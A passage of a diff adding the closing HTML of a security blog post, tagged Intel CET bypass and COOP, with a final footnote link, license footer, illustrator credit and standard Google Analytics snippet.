+<p>(Microsoft, 2022): <a href="https://docs.microsoft.com/en-us/cpp/cpp/this-pointer?view=msvc-170">https://docs.microsoft.com/en-us/cpp/cpp/this-pointer?view=msvc-170</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+            </div>
+        </article>
+        <hr />
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="../../../../tags/intel.html">Intel</a></span><span class="tag"><a href="../../../../tags/cet.html">CET</a></span><span class="tag"><a href="../../../../tags/bypass.html">bypass</a></span><span class="tag"><a href="../../../../tags/coop.html">COOP</a></span><span class="tag"><a href="../../../../tags/counterfeit-object-oriented-programming.html">Counterfeit Object Oriented Programming</a></span>
+                </p>
+        </div>
+    </main>
+            </div>
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span style="font-size: 14px;">&copy; 2024</span>
+            <span>
+                <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" title="This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.">
+                    License
+                </a>
+            </span>
+            <span>
+                    <a href="../../../../index.xml" target="_blank" title="rss">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss">
+                            <path d="M4 11a9 9 0 0 1 9 9"></path>
+                            <path d="M4 4a16 16 0 0 1 16 16"></path>
+                            <circle cx="5" cy="19" r="1"></circle>
+                        </svg>
+                    </a>
+            </span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>
+                <h5>Illustrations by &nbsp;<a target="_blank" href="https://instagram.com/sergio_kalisiak">Sergio Kalisiak</a></h5>
+            </span>
+        </div>
+    </div>
+</footer>
+        </div>
+<script type="text/javascript" src="../../../../bundle.min.8750240a1a2b5e2e02df200915140d47eadf74d9f9510dfe046bef237f486c4542dca2cd6c82d7241a01a6baf1e05afaf2385d481144ad18c0251d56db724273.js" ></script>
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'G-18TCRTW8CL', 'auto');
+        ga('send', 'pageview');
+    </script>
+    </body>
+</html>
